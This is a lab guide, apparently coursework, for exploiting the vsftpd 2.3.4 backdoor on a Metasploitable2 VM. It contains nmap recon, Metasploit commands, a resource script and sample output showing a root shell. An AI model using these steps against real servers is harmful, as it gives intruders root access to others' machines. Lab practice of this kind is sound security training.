# Practical Guide — Task 7 (Metasploit — vsftpd 2.3.4 Backdoor Exploit)

Repo: https://github.com/Bhandarihansraj/cyberSEC

---

## Part 1 — Metasploit Setup

### Check if already installed
```bash
msfconsole -v
```
Kali/Parrot usually ship with it pre-installed. If not:
```bash
sudo apt update
sudo apt install metasploit-framework -y
```

### Start the database (required once per boot)
```bash
sudo service postgresql start
sudo msfdb init      # only needed the first time ever
```
(`run.sh` below does the `postgresql start` step for you automatically.)

### Verify it starts
```bash
msfconsole -q
```
You should land on an `msf6 >` prompt. Type `exit` to leave.

---

## Part 2 — Target Setup (Metasploitable2)

This exploit needs a **real second VM** — Docker can't substitute for a full
Metasploitable2 image here.

1. Download Metasploitable2, import the `.vmdk`/`.ova` into VirtualBox
2. Set its network adapter to the same mode as Kali (Bridged or Host-only —
   whichever lets the two VMs reach each other)
3. Boot it, login `msfadmin` / `msfadmin`
4. Get its IP: `ifconfig` (or `ip a`) — this is your **RHOSTS**
5. On Kali, get your own IP: `ip a` — this is your **LHOST**
6. Confirm they can reach each other: `ping <metasploitable2-ip>` from Kali

---

## Part 3 — Automated recon (Nmap) + exploit, all in one command

```bash
./tasks/task7_metasploit/run.sh start
```

What it does, in order:
1. Starts `postgresql` (needed by Metasploit's database)
2. Asks for your target IP
3. **Runs `nmap -sV -p 21 <target>` automatically** and checks the output for
   `vsftpd 2.3.4` — if that exact version isn't detected, it warns you and
   asks whether to continue anyway (so you don't waste time launching an
   exploit against a patched/different target)
4. Asks for your LHOST/LPORT
5. Fills in `exploit_vsftpd.rc` with your values and runs:
   ```bash
   msfconsole -q -r exploit_vsftpd.rc
   ```
   which executes `use` -> `set RHOSTS` -> `set payload` -> `set LHOST/LPORT` ->
   `show options` -> `exploit` automatically, no manual typing inside msfconsole

### Sample run
```
== Nmap recon: checking port 21 on 192.168.0.12 ==
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
>> vsftpd 2.3.4 confirmed — target is vulnerable, proceeding.
Your Kali attacker IP (LHOST): 192.168.0.11
LPORT [3435]:
Running exploit against 192.168.0.12 ...
[*] 192.168.0.12:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 192.168.0.12:21 - Backdoor service has been spawned, handling...
[+] 192.168.0.12:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (192.168.0.11:3435 -> 192.168.0.12:6200)
```
You're now in a root shell. Try: `id`, `whoami`, `uname -a`.

---

## Part 4 — Manual steps (if you want to type it yourself instead)

```bash
sudo service postgresql start
msfconsole -q

# Recon
nmap -sV -p 21 <target-ip>

# Exploit
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS <target-ip>
show payloads
set payload cmd/unix/interact
set LHOST <your-ip>
set LPORT 3435
show options
exploit
```

---

## Part 5 — How the automation script works (`exploit_vsftpd.rc`)

This is a **Metasploit resource script** — a plain text file of msfconsole
commands, run top to bottom with `msfconsole -r file.rc`, exactly as if you'd
typed each line yourself:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS __RHOSTS__
set RPORT 21
set payload cmd/unix/interact
set LHOST __LHOST__
set LPORT __LPORT__
show options
exploit
```
`run.sh` uses `sed` to replace `__RHOSTS__`, `__LHOST__`, `__LPORT__` with
what you typed in, writes it to a temp `.rc` file, and feeds that to
msfconsole — that's the entire automation, no magic beyond text substitution.

---

## Cleanup
```bash
./tasks/task7_metasploit/run.sh stop
```
Removes the generated resource script. Exit the shell session manually
(`exit` inside the shell, `exit` again in msfconsole) when you're done.

## Why this exploit exists
vsFTPd 2.3.4's source archive was compromised between 2011-06-30 and
2011-07-01 with a backdoor: sending a username ending in `:)` opens a shell
on TCP port 6200. The Metasploit module automates triggering that backdoor
and catching the resulting shell — that's what `vsftpd_234_backdoor` does
under the hood.
